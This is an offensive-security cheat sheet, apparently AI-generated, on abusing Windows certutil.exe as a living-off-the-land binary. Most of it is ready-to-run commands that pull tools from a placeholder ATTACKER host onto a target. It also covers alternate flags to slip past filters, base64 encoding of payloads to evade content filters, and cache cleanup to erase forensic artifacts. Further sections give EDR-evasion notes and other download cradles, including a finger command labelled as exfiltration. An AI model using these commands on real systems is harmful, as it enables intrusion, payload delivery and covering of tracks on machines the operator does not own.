# certutil

**Tags:** `#certutil` `#lolbin` `#filetransfer` `#windows` `#download` `#base64` `#encode`

Windows built-in certificate utility (`certutil.exe`) — heavily abused as a LOLBin for file download and base64 encoding/decoding. Available on every Windows version since XP. Primary use: download tools onto Windows targets when PowerShell is restricted and other download methods are blocked. Also useful for encoding payloads and verifying file hashes.

**Source:** Built into Windows (`C:\Windows\System32\certutil.exe`)

```cmd
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe
```

> [!note] **certutil vs PowerShell download** — PowerShell `IEX`/`DownloadString` is monitored by AMSI and most EDRs. certutil bypasses AMSI (it's a native binary) and is useful when PowerShell execution is restricted. However, certutil downloads are heavily logged in Windows event logs and flagged by most EDR products — it's well-known as a LOLBin.

---

## File Download

```cmd
:: Download to specific path
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe

:: Download to current directory
certutil -urlcache -split -f http://ATTACKER/tool.exe tool.exe

:: HTTPS download (skip cert verification issues — use HTTP when possible)
certutil -urlcache -split -f https://ATTACKER/tool.exe C:\Windows\Temp\tool.exe

:: Download and verify hash
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe && certutil -hashfile C:\Windows\Temp\tool.exe SHA256

:: Clean URL cache after download (remove artifacts)
certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Windows\Temp\tool.exe
certutil -urlcache -f http://ATTACKER/tool.exe delete
```

---

## Base64 Encode / Decode

Useful for encoding payloads to bypass content filters or transferring binary files as text.

```cmd
:: Encode file to base64
certutil -encode C:\Windows\Temp\tool.exe C:\Windows\Temp\tool.b64

:: Decode base64 back to binary
certutil -decode C:\Windows\Temp\tool.b64 C:\Windows\Temp\tool.exe

:: Encode a script (for manual transfer / paste into console)
certutil -encode payload.ps1 payload.b64
:: Copy contents of payload.b64, paste onto target, then decode
```

**Workflow — transfer binary over text channel (e.g., shell without upload):**
```bash
# On Kali — encode
base64 -w0 tool.exe > tool.b64
cat tool.b64   # copy output

# On Windows — paste into file, then decode
# echo <base64content> > C:\Windows\Temp\tool.b64
certutil -decode C:\Windows\Temp\tool.b64 C:\Windows\Temp\tool.exe
```

---

## File Hash Verification

```cmd
:: SHA256 hash
certutil -hashfile C:\Windows\Temp\file.exe SHA256

:: MD5 hash
certutil -hashfile C:\Windows\Temp\file.exe MD5

:: SHA1 hash
certutil -hashfile C:\Windows\Temp\file.exe SHA1
```

---

## Alternate Syntax (Older Windows / Bypass Filters)

Some defenses block `-urlcache` — alternate forms:

```cmd
:: Alternate flags
certutil.exe -verifyctl -f -split http://ATTACKER/tool.exe tool.exe

:: Use full path to avoid PATH hijacking detections
C:\Windows\System32\certutil.exe -urlcache -split -f http://ATTACKER/tool.exe C:\Temp\tool.exe

:: Via PowerShell if cmd is restricted
powershell -c "certutil -urlcache -split -f http://ATTACKER/tool.exe C:\Temp\tool.exe"
```

---

## Cache Cleanup (OPSEC)

certutil caches downloaded files — clean up to reduce artifacts:

```cmd
:: Delete specific cached URL
certutil -urlcache -f http://ATTACKER/tool.exe delete

:: Clear entire URL cache
certutil -urlcache * delete

:: Verify cache is cleared
certutil -urlcache
```

---

## OPSEC Notes

- certutil LOLBin usage is extremely well-signatured — most EDR products alert on `-urlcache` download
- Windows Event ID **4688** (process creation) logs `certutil.exe` execution with full command line if audit policy is enabled
- Downloaded files are cached in `%LOCALAPPDATA%\Microsoft\Windows\INetCache\` until explicitly cleared
- Consider alternatives when EDR is present: `bitsadmin`, `Invoke-WebRequest`, PowerShell download cradles, or SMB transfer
- Encoding/decoding operations are less monitored than URL downloads — encoding payloads still useful

---

## Quick Alternatives (Windows LOLBins)

When certutil is blocked, other Windows-native download options:

```cmd
:: PowerShell (most flexible)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/tool.exe','C:\Temp\tool.exe')"

:: BITSAdmin
bitsadmin /transfer job /download /priority high http://ATTACKER/tool.exe C:\Temp\tool.exe

:: Expand (cab file download)
expand http://ATTACKER/tool.cab C:\Temp\tool.exe

:: Finger (exfil, not download — old but works)
finger user@ATTACKER | more +2 > C:\Temp\out.txt
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
